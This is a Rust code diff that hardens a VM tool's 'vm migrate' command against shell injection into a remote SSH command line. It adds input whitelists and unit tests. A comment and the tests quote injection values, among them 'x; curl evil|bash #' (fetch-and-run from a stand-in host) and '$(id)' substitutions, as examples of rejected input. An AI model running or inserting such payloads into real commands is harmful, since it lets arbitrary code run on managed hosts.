@@ -2856,6 +2856,43 @@ fn random_suffix() -> String {
     buf.iter().map(|b| format!("{b:02x}")).collect()
 }
 
+/// Whitelist for `vm migrate`'s `--network`: the same charset
+/// `delonix_sdn::NetworkStore::create` already enforces for a network's own
+/// name (alphanumeric plus `-`/`_`). This string is interpolated into a
+/// `delonix vm create ... --network {network}` invocation that
+/// `migrate_transfer_and_create` runs on the TARGET host via
+/// `remote::ssh_run_as_user` — a real `bash -c` on a remote host the
+/// operator manages. `shell_quote` (`remote.rs`) only protects the local
+/// ssh→bash-c boundary; it never sanitizes the CONTENT of the string once it
+/// lands in the remote shell, exactly the lesson `cluster.rs::valid_endpoint`/
+/// `valid_cidr`/`valid_version` already encode for the cluster-bootstrap
+/// path (see AGENTS.md, "Auditoria de segurança"). `--backend` is validated
+/// separately by `delonix_vm::valid_backend_name`, which also normalizes
+/// aliases against a closed whitelist.
+fn valid_migrate_network_name(s: &str) -> bool {
+    !s.is_empty()
+        && s.chars()
+            .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
+}
+
+/// Whitelist for `vm migrate`'s `--memory`, interpolated the same way as
+/// `--network` above. Accepts exactly the shapes [`delonix_vm::mem_mib`]
+/// parses (`"2G"`/`"1024M"`/`"512"`/`"2Gi"`) — nothing else. A value
+/// `mem_mib` cannot parse would already silently fall back to 1024 MiB on
+/// the target; refusing it here fails fast instead of migrating under a
+/// silently different memory limit, and closes the same injection class as
+/// the network check.
+fn valid_migrate_memory_spec(s: &str) -> bool {
+    // No `trim()`: the raw string is what gets interpolated, so whitespace
+    // (a trailing newline included) must be refused, not tolerated.
+    let t = s.strip_suffix(['i', 'I']).unwrap_or(s);
+    let digits = t
+        .strip_suffix(['G', 'g'])
+        .or_else(|| t.strip_suffix(['M', 'm']))
+        .unwrap_or(t);
+    !digits.is_empty() && digits.chars().all(|c| c.is_ascii_digit())
+}
+
 /// `vm migrate` — see the `VmCmd::Migrate` doc comment for the shape of the
 /// operation. Every step after the local flatten runs on the TARGET over SSH
 /// (`remote::scp_to`/`ssh_run_as_user` — NOT `ssh_run`, whose `sudo -n`
@@ -2863,6 +2900,14 @@ fn random_suffix() -> String {
 /// user, against the wrong rootless state root entirely), so a failure at
 /// any point leaves the source VM's own state untouched — `--remove-source`
 /// only runs after the target confirms the new VM was created.
+///
+/// `--network`/`--backend`/`--memory` are validated FIRST, before touching
+/// the source VM at all — a security-audit finding (2026-09): they used to
+/// flow unchecked into the remote `delonix vm create` command line built by
+/// `migrate_transfer_and_create`, which is real shell interpolation on a
+/// host the operator manages (`network: "x; curl evil|bash #"` terminated
+/// the intended command and ran the rest as the SSH user). Failing here,
+/// before the (expensive) disk flatten, also means a typo costs nothing.
 #[allow(clippy::too_many_arguments)]
 fn cmd_migrate(
     base: &std::path::Path,
@@ -2877,6 +2922,24 @@ fn cmd_migrate(
     memory: Option<&str>,
     remove_source: bool,
 ) -> Result<()> {
+    if !valid_migrate_network_name(network) {
+        return Err(Error::Invalid(super::po::tf(
+            "invalid --network '{network}' — network names are letters, digits, '-' and '_' only",
+            &[("network", network)],
+        )));
+    }
+    // The CANONICAL name (a `&'static str` from the registry), not the raw
+    // input: `valid_backend_name` trims and lowercases, so the raw string could
+    // still carry a trailing newline into the remote command line.
+    let backend = backend.map(delonix_vm::valid_backend_name).transpose()?;
+    if let Some(m) = memory {
+        if !valid_migrate_memory_spec(m) {
+            return Err(Error::Invalid(super::po::tf(
+                "invalid --memory '{memory}' — expected a shape like '2G', '1024M' or '512'",
+                &[("memory", m)],
+            )));
+        }
+    }
     let vm = delonix_vm::status(base, name)?;
     if vm.status == delonix_model::records::Status::Running {
         eprintln!(
@@ -3663,6 +3726,42 @@ pub(crate) fn init_for(
 
 #[cfg(test)]
 mod tests {
+    use super::{valid_migrate_memory_spec, valid_migrate_network_name};
+
+    #[test]
+    fn migrate_network_rejects_shell_injection() {
+        for bad in [
+            "x; curl evil|bash #",
+            "a b",
+            "$(id)",
+            "`id`",
+            "a&&b",
+            "a\nb",
+            "",
+            "../x",
+            "a'b",
+        ] {
+            assert!(!valid_migrate_network_name(bad), "{bad:?}");
+        }
+        assert!(valid_migrate_network_name("ingress"));
+        assert!(valid_migrate_network_name("lab-net_2"));
+    }
+
+    #[test]
+    fn migrate_memory_rejects_shell_injection() {
+        for bad in ["2G; id", "$(id)", "2 G", "", "G", "2GB", "-1G", "1G\n"] {
+            assert!(!valid_migrate_memory_spec(bad), "{bad:?}");
+        }
+        for ok in ["2G", "1024M", "512", "2Gi", "512Mi", "4g"] {
+            assert!(valid_migrate_memory_spec(ok), "{ok:?}");
+        }
+    }
+
+    #[test]
+    fn migrate_backend_rejects_shell_injection() {
+        assert!(delonix_vm::valid_backend_name("libvirt; id").is_err());
+        assert!(delonix_vm::valid_backend_name("$(id)").is_err());
+    }
 
     /// Exactamente um de `disk`/`build`, e as duas recusas dizem coisas
     /// diferentes porque os enganos são diferentes: nenhum é um manifesto sem
